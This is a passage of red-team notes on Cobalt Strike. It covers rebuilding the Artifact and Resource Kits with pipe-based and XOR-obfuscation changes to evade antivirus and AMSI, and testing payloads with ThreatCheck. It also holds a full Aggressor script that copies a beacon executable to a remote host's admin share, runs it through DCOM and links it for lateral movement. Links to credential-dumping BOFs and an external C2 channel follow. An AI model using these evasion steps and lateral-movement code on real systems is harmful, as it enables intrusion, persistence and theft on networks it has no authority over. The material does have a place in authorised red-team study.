<h3 id="artifact-kit">Artifact-kit</h3>
<ul>
<li>Used to modify the binary (EXE &amp; DLL) payloads</li>
<li>Location <code>cobaltstrike\arsenal-kit\kits\artifact</code></li>
<li>The <code>src-main/main.c</code> is the entry points for the EXE artifacts.</li>
<li><code>src-common/bypass-template.c</code> shows how one can implement some logic inside the start function from <code>main.c</code></li>
<li>We can use the <code>bypass-pipe.c</code> to evade AV.
</li>
</ul>
<h3 id="change-bypass-pipec">Change bypass-pipe.c</h3>
<p><code>vim /opt/cobaltstrike/artifact-kit/src-common/bypass-pipe.c</code>
</p>
<h3 id="edit-the-following-line">Edit the following line</h3>
<ul>
<li>Nothing needs to be changed right now, but might want to change the pipe name part. Example:
<code>"%c%c%c%c%c%c%c%c%cnetsvc\\%d"
"%c%c%c%c%c%c%c%c%cprintsvc-%d-server"</code>
</li>
</ul>
<h4 id="built-artifact-kit">Built artifact kit</h4>
<ul>
<li>Files should go to the client.
<code>./build.sh &lt;techniques&gt; &lt;allocator&gt; &lt;stage&gt; &lt;rdll size&gt; &lt;include resource file&gt; &lt;output directory&gt;
./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts</code>
</li>
</ul>
<h4 id="load-artifactcna">Load artifact.cna</h4>
<ul>
<li>Click on Cobalt Strike -&gt; Script Manager -&gt; Load <code>artifact.cna</code> from the output directory</li>
<li>Reload cobaltstrike UI</li>
<li>Use Payloads -&gt; Windows Stageless Generate All Payloads to replace all 
</li>
</ul>
<h4 id="run-threatcheck-on-payload">Run threatcheck on payload</h4>
<p><code>.\ThreatCheck.exe -f &lt;PAYLOAD&gt;</code>
</p>
<h3 id="resource-kit">Resource-kit</h3>
<ul>
<li>Used to modify script-based payloads including the PowerShell, Python, HTA and VBA templates.</li>
<li>Location: <code>cobaltstrike\arsenal-kit\kits\resource</code></li>
<li>Using <code>template.x64.ps1</code> is enough.</li>
<li>Files should go to the client.
</li>
</ul>
<h4 id="change-templatex64ps1">Change template.x64.ps1</h4>
<ul>
<li>From --&gt; To</li>
<li>Change ALL variables in the file
```
for ($zz = 0; $zz -lt $v_code.Count; $zz++) {
    $v_code[$zz] = $v_code[$zz] -bxor 35
}</li>
</ul>
<p>for ($i = 0; $i -lt $v_service.Count; $i++) {
    $var_service[$i] = $v_service[$i] -bxor 35
}
<div class="highlight"><pre><span></span><code>#### Channge compress.ps1
- https://offensivedefence.co.uk/posts/making-amsi-jump/

#### Rebuilt resource kit
</code></pre></div>
./build.sh /mnt/c/Tools/cobaltstrike/resources
<div class="highlight"><pre><span></span><code>#### Load resources.cna
- Click on Cobalt Strike -&gt; Script Manager -&gt; Load `resources.cna` 
- Reload cobaltstrike UI
- Use Payloads -&gt; Windows Stageless Generate All Payloads to replace all

#### Run threatcheck on payload
</code></pre></div>
.\ThreatCheck.exe -f <PAYLOAD> -e AMSI
<div class="highlight"><pre><span></span><code>## Extending Cobalt Strike
### Agressor scripts
### Jump and remote-exec
- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register
- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register

#### Jump dcom command
- Using https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
</code></pre></div>
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');</p>
<pre><code># acknowledge this command1
btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

# read in the script
$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
$script = readb($handle, -1);
closef($handle);

# host the script in Beacon
$oneliner = beacon_host_script($1, $script);

# generate stageless payload
$payload = artifact_payload($3, "exe", "x64");

# upload to the target
bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

# run via powerpick
bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

# link if p2p beacon
beacon_link($1, $2, $3);
</code></pre>
<p>}</p>
<p>beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &amp;invoke_dcom);
```</p>
<h3 id="beacon-object-files">Beacon Object Files</h3>
<ul>
<li>Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process.</li>
<li>BOFs are essentially tiny COFF objects (written in C or C++) on which Beacon acts as a linker and loader. </li>
<li>Download https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h</li>
<li>Usefull BOFs:</li>
<li>https://github.com/WKL-Sec/HiddenDesktop</li>
<li>https://github.com/trustedsec/CS-Situational-Awareness-BOF</li>
<li>https://github.com/CCob/BOF.NET</li>
<li>https://github.com/helpsystems/nanodump</li>
<li>https://github.com/outflanknl/InlineWhispers</li>
</ul>
<h3 id="external-c2">External C2</h3>
<ul>
<li>https://github.com/RedSiege/GraphStrike?tab=readme-ov-file</li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.ad660dcc.min.js"></script>
      
    
  </body>
</html>